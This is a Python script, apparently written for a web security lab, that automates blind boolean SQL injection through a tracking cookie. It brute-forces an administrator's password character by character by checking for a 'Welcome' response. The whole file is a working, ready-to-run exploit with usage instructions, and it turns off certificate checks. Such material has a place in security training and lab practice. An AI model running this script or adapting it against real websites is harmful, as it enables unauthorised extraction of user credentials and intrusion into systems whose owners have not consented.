import sys
import requests
import urllib3
import urllib

# to disable any warnings we're going to get from certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# to debug the scripts when they don't work and it'll send all requests that aredone in 
# the script to burpsuite so that we can see them in case something does not work properly
# uncomment the proxies if you wanna debug the script (don't forget to run the burpsuite).
#proxies = {'http': 'http:127.0.0.1:8080', 'https':https:127.0.0.1:8080'}


# that function will output the administrator password and what it will do is it will 
# show you in real time all the different characters that are being tried and then 
# once it hits the true character which the app responds correctly then it will set 
# that character and move on to the other character.
def sqli_password(pass_length, username, cookies_name, cookies_value, session, url):
    # the true password will be stored here
    password_extracted = ''
    # password length to try each character password
    for i in range(1, pass_length + 1):
        # try each character with decimal representation of a character (see ASCII Table)
        for j in range(48,123): # default: 32, 126
            # payload for vulnerable web parameter, we need ASCII representation from
            # character so we use ascii function.
            sqli_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='{username}')='{j}"
            
            # Replace special characters in string using the %xx escape. (url encoding)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            # parameter who vulnerable, in this case is cookie. (you can change according to your case)
            cookies = {cookies_name:cookies_value + sqli_payload_encoded, 'session':session}
            
            # make request, in this case get, verify set to false because i don't want to verify certificates
            request = requests.get(url, cookies=cookies, verify=False) # you can add proxies=proxies if you wanna debug.
            
            # whether the characters (payload) sent are true
            # in this case, if true then there will be a welcome text. (match the response you get)
            if 'Welcome' not in request.text:
                # print tried characters to console in real time.
                # chr() function use to get a string representing of a character
                sys.stdout.write('\r' + password_extracted + chr(j))

                # it will write everything in the buffer to the console.
                sys.stdout.flush()

            # conditions where there is a welcome text in http response
            else:
                # store true character of password to the password variable
                # chr() function use to get a string representing of a character, because the result still decimal representation.
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                # move on to the next index of password character
                break

def main():
    if len(sys.argv) != 7:
        print(f'(+) Usage: {sys.argv[0]} <password length> <username> <cookie\'s name> <cookie\' value> <session> <url>')
        print(f'(+) Example: {sys.argv[0]} 10 administrator TrackingId xyz abc www.example.com')
        sys.exit()
    
    # url from arguement
    pass_length = int(sys.argv[1])
    username = sys.argv[2]
    cookies_name = sys.argv[3]
    cookies_value = sys.argv[4]
    session = sys.argv[5]
    url = sys.argv[6]
    print(f'(+) Retrieving {sys.argv[2]} password...')
    #run the sqli_password function
    sqli_password(pass_length, username, cookies_name, cookies_value, session, url)
    print('\n')



if __name__ == "__main__":
    main()
